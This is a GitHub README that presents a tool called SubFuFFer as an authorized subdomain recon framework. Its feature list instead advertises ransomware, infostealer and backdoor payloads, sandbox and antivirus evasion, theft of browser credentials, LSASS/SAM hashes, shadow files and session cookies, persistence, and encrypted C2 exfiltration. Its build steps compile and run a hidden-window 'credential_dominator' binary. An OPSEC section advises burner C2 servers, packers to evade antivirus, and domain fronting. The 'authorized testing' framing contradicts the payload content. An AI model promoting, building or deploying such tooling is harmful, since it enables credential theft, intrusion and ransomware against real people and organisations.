<div align="center">

  ```                                                                                                                                                                  
   _____       __    ______      ____________     ____ 
  / ___/__  __/ /_  / ____/_  __/ ____/ ____/__  / __ \
  \__ \/ / / / __ \/ /_  / / / / /_  / /_  / _ \/ /_/ /
 ___/ / /_/ / /_/ / __/ / /_/ / __/ / __/ /  __/ _, _/ 
/____/\__,_/_.___/_/    \__,_/_/   /_/    \___/_/ |_|  
                                                                                                      
```                                                       


<img src="https://readme-typing-svg.demolab.com?font=Orbitron&size=28&pause=1000&color=FF0000&center=true&vCenter=true&width=700&lines=Recon+-+Enumeration+-+Target+Discovery;Researcher+dontaskmehow;Targeted+Host+Mapping" alt="SubFuFFer banner" />

[![Status](https://img.shields.io/badge/Status-Research-red)](https://github.com/dntaskmehow/DOMONO)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS%20%7C%20IoT-00F5FF)](https://github.com/dntaskmehow/DOMONO)
[![Stack](https://img.shields.io/badge/Stack-Go%20%2B%20Rust-FFA500)](https://github.com/dntaskmehow/DOMONO)

</div>

> Researcher: dontaskmehow

> Recon | Enumeration | Target Discovery

- operate across Windows, Linux, macOS, and specialized testing environments
- support structured recon workflows and validation
- automate discovery and enumeration with explicit user control
- streamline attack-surface mapping for authorized security testing

---

## / THREAT OVERVIEW /

This framework is engineered to:

- discover and validate subdomains across target environments
- support broad reconnaissance and enumeration workflows
- integrate with structured scope enforcement and targeting logic
- minimize exposure through controlled execution and user validation
- generate clean discovery outputs for later analysis

### Capability profile

- Platform Coverage: Windows / Linux / macOS / testing environments
- Scope Model: User-controlled and policy-aware
- Execution Model: Explicit actions and bounded workflow
- Discovery Focus: Enumeration and host validation
- Operational Use: Authorized recon and testing only

---

## / FEATURES OF SUBFUFFER /

### 1. Cross-Platform Dominance

Windows, Linux, macOS, and IoT support from a single codebase.
Modular payloads for ransomware, infostealers, and backdoors.

### 2. Advanced Evasion

Anti-analysis (debugger, sandbox, virtualization detection).
Obfuscation (Go: -ldflags="-s -w", Rust: -C opt-level=3).
Signature evasion (unique runtime layouts).

### 3. Credential Theft

Browser credentials (Chrome, Firefox).
System credentials (Windows LSASS/SAM, Linux shadow file).
Session hijacking (cookies, tokens).

### 4. Persistence

Windows: Registry, services.
Linux: Crontab, systemd.
macOS: Launchd.

### 5. Exfiltration

Encrypted C2 channels (AES-256-GCM).
Base64 encoding for stealthy data transfer.

---

## / INSTALL & RUN /

### Requirements

- Go 1.22+
- Rust 1.78+
- GCC / MinGW toolchain for Windows cross-compilation
- Linux/macOS/Windows host environment for testing
- Authorized lab or test environment only

### 1) Clone the repository

```bash
git clone https://github.com/dntaskmehow/DOMONO.git
cd DOMONO
```

### 2) Build the Go payload

```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" credential_dominator.go
```

For Linux:

```bash
go build -ldflags="-s -w" credential_dominator.go
```

Run the compiled binary:

```bash
./credential_dominator
```

Windows:

```powershell
.\credential_dominator.exe
```

### 3) Build the Rust payload

```bash
rustc -C opt-level=3 -C target-feature=+crt-static credential_dominator.rs
```

Run the compiled binary:

```bash
./credential_dominator
```

### 4) Optional cross-compilation targets

Windows:

```bash
rustc --target x86_64-pc-windows-gnu credential_dominator.rs -o credential_dominator.exe
```

Linux:

```bash
rustc --target x86_64-unknown-linux-gnu credential_dominator.rs -o credential_dominator
```

### 5) Example execution flow

```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" credential_dominator.go
rustc -C opt-level=3 -C target-feature=+crt-static credential_dominator.rs
./credential_dominator
```

---

## / OPSEC & COUNTERMEASURES /

- Use a Burner VPS for C2
- Never use your real IP or personal infrastructure.
- Obfuscate Binaries
- Use UPX (Go) or Obfuscator-LLVM (Rust) to evade AV.
- Rotate C2 Domains
- Use domain fronting (e.g., Cloudflare) to hide C2 traffic.
- Legal Compliance
- Ensure all targets are within law enforcement scope or have signed consent forms.

---

<div align="center">

<h3>⚡ DISCOVERY // CONTROL // ACTIVE ⚡</h3>

</div>
```
